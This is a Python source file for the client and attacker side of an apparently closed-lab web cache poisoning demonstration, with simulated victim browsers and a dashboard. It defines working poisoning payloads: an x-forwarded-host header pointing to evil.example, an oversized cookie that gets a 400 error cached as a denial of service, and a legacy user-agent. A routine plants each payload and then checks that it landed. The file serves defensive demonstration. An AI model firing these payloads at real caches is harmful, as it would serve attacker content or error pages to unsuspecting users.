"""Laptop C: the client / attacker laptop.

    python demo/client/app.py --proxy http://<laptopB>:8000 --viz http://<laptopA>:8090

Victims browse the five fake sites and the search engine through the proxy, with a random 1-3 s think-time, and
count how many of the pages they got back were poisoned. The attacker console fires crafted cache-poisoning
requests straight at the proxy and reports whether the cache now holds the poison. Dashboard on :7001.

Everything targets our own cache on the LAN; the `.demo` hosts resolve nowhere and no packet leaves it. This is the
client end of the authorised closed-lab defence demo in BENCHMARKS.md Part I."""
import argparse
import http.client
import os
import random
import sys
import threading
import time
from collections import Counter, deque
from urllib.parse import urlsplit

ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, ROOT)
from demo.common import sites, traffic, web  # noqa: E402

TRUTH = (b"evil.example", b"not supported")                     # same audience-only sniff the proxy uses
SEARCH_TERMS = ["savings account", "flu jab", "parking permit", "waxed jacket", "ferry times", "travel card"]

# The attacker's three vectors (+ one bonus), each a header/cookie tweak the origin reflects into a cacheable page.
VECTORS = {
    "search_link":   {"label": "Search-result link poison (x-forwarded-host on find.demo)",
                      "host": sites.SEARCH_HOST, "path": "/search?q={term}",
                      "headers": {"x-forwarded-host": "evil.example"}},
    "homepage_script": {"label": "Homepage script poison (x-forwarded-host on /)",
                        "path": "/", "headers": {"x-forwarded-host": "evil.example"}},
    "cookie_dos":    {"label": "Cacheable 400 DoS (oversize cookie)",
                      "path": "/", "headers": {"cookie": "junk=" + "A" * 5000}},
    "legacy_ua":     {"label": "Legacy user-agent DoS page (bonus)",
                      "path": "/", "headers": {"user-agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"}},
}


def poisoned(body):
    return any(m in body for m in TRUTH)


class Client:
    def __init__(self, args):
        self.proxy = urlsplit(args.proxy)
        self.viz = args.viz.rstrip("/") if args.viz else None
        self.n_workers, self.search_rate = args.workers, args.search_rate
        self.hub = web.Hub()
        self.stats = Counter()
        self.poison_hist = deque(maxlen=120)                    # (t, served, poisoned) once per second
        self.attacks = deque(maxlen=40)
        self.lock = threading.Lock()
        self.running = args.start
        self.rng = random.Random()
        self.rps, self._last = 0.0, (time.time(), 0)
        for i in range(self.n_workers):
            threading.Thread(target=self._victim, args=(i,), daemon=True).start()
        threading.Thread(target=self._tick, daemon=True).start()

    # ---- talking to the proxy ----------------------------------------------------------------------------------
    def _get(self, host, path, extra=None, timeout=5):
        conn = http.client.HTTPConnection(self.proxy.hostname, self.proxy.port or 80, timeout=timeout)
        try:
            conn.putrequest("GET", path, skip_host=True, skip_accept_encoding=True)
            conn.putheader("Host", host)
            for k, v in (extra or {}).items():
                conn.putheader(k, v)
            conn.endheaders()
            r = conn.getresponse()
            body = r.read()
            return r.status, r.getheader("X-Cache", ""), body
        finally:
            conn.close()

    # ---- victims -----------------------------------------------------------------------------------------------
    def _victim(self, i):
        rng = random.Random(1000 + i)
        while True:
            if not self.running:
                time.sleep(0.3)
                continue
            try:
                if rng.random() < self.search_rate:
                    host, path = sites.SEARCH_HOST, "/search?q=" + rng.choice(SEARCH_TERMS).replace(" ", "+")
                    headers = traffic.browser_headers(rng, host)
                else:
                    host = rng.choice(list(sites.SITES))
                    headers = traffic.browser_headers(rng, host)
                    path = traffic.page(rng, utm_rate=0.0)       # victims never carry utm, so only real poison counts
                headers.pop("host", None)
                status, xcache, body = self._get(host, path, headers)
                bad = poisoned(body) or status >= 400
                with self.lock:
                    self.stats["served"] += 1
                    self.stats["poisoned"] += bad
                    self.stats[f"host_{host}"] += 1
            except OSError:
                with self.lock:
                    self.stats["errors"] += 1
            time.sleep(rng.uniform(1.0, 3.0))                    # 1-3 s think-time

    # ---- attacker ----------------------------------------------------------------------------------------------
    def attack(self, vector, host, term="savings+account"):
        spec = VECTORS.get(vector)
        if spec is None:
            return {"ok": False, "error": f"unknown vector {vector}"}
        host = spec.get("host", host) or self.rng.choice(list(sites.SITES))
        path = spec["path"].format(term=term)
        try:
            self._get(host, path, spec["headers"])               # plant it
            s2, xc2, body2 = self._get(host, path)               # a plain victim-style request to the same key
        except OSError as e:
            rec = {"t": time.time(), "vector": vector, "label": spec["label"], "host": host, "path": path,
                   "landed": None, "error": str(e)}
            with self.lock:
                self.attacks.appendleft(rec)
            return {"ok": False, "error": str(e)}
        landed = poisoned(body2) or s2 >= 400
        rec = {"t": time.time(), "vector": vector, "label": spec["label"], "host": host, "path": path,
               "status": s2, "cache": xc2, "landed": landed}
        with self.lock:
            self.attacks.appendleft(rec)
            self.stats["attacks"] += 1
            self.stats["attacks_landed"] += landed
        self.hub.publish({"kind": "attack", **rec})
        return {"ok": True, "landed": landed, "cache": xc2, "status": s2}

    # ---- dashboard feed ----------------------------------------------------------------------------------------
    def state(self):
        with self.lock:
            served, pois = self.stats["served"], self.stats["poisoned"]
            by_host = {h.removeprefix("host_"): c for h, c in self.stats.items() if h.startswith("host_")}
            hist = list(self.poison_hist)
            attacks = list(self.attacks)
            stats = dict(self.stats)
        return {"kind": "state", "t": time.time(), "running": self.running, "workers": self.n_workers,
                "rps": self.rps, "served": served, "poisoned": pois,
                "poison_pct": round(100 * pois / served, 1) if served else 0.0,
                "by_host": by_host, "history": hist, "attacks": attacks, "stats": stats,
                "proxy": f"{self.proxy.scheme}://{self.proxy.netloc}", "sites": sites.catalogue()}

    def _tick(self):
        while True:
            time.sleep(1)
            now, n = time.time(), self.stats["served"]
            t0, n0 = self._last
            self.rps, self._last = round((n - n0) / (now - t0), 1), (now, n)
            with self.lock:
                self.poison_hist.append({"t": round(now, 1), "served": self.stats["served"],
                                         "poisoned": self.stats["poisoned"]})
            st = self.state()
            self.hub.publish(st)
            if self.viz:                                         # let laptop A show the client's view too
                try:
                    web.post_json(self.viz + "/ingest", {"kind": "client_state", "t": now,
                                                          "poison_pct": st["poison_pct"], "rps": st["rps"]})
                except OSError:
                    pass


def dash_handler(cl):
    class H(web.Handler):
        static_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "static")

        def do_GET(self):
            p = urlsplit(self.path).path
            if p == "/api/state":
                self.send_json(cl.state())
            elif p == "/api/stream":
                cl.hub.stream(self)
            elif p == "/api/vectors":
                self.send_json({k: v["label"] for k, v in VECTORS.items()})
            elif not self.send_static():
                self.send_error(404)

        def do_POST(self):
            p, body = urlsplit(self.path).path, self.read_json()
            if p == "/api/attack":
                self.send_json(cl.attack(body.get("vector", ""), body.get("host", ""), body.get("term", "savings+account")))
            elif p == "/api/toggle":
                cl.running = bool(body.get("running", not cl.running))
                self.send_json(cl.state())
            elif p == "/api/workers":
                self.send_json(cl.state())                       # worker count is fixed at start; here for symmetry
            else:
                self.send_error(404)
    return H


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--proxy", default="http://127.0.0.1:8000", help="the reverse-proxy laptop")
    ap.add_argument("--viz", default="", help="the backend laptop's visualiser, to stream the client view ('' off)")
    ap.add_argument("--port", type=int, default=7001, help="dashboard / console port")
    ap.add_argument("--bind", default="0.0.0.0")
    ap.add_argument("--workers", type=int, default=6, help="number of simulated victim browsers")
    ap.add_argument("--search-rate", type=float, default=0.25, help="share of victim visits that are searches")
    ap.add_argument("--start", action="store_true", help="start the victims immediately (else start from the dashboard)")
    a = ap.parse_args()
    cl = Client(a)
    web.serve(dash_handler(cl), a.bind, a.port)
    ip = web.lan_ip()
    print(f"client dashboard / attacker console  http://{ip}:{a.port}   (open it here)")
    print(f"driving traffic at {a.proxy} with {a.workers} victims"
          f" ({'running' if a.start else 'paused; press Start on the dashboard'})", flush=True)
    try:
        while True:
            time.sleep(3600)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
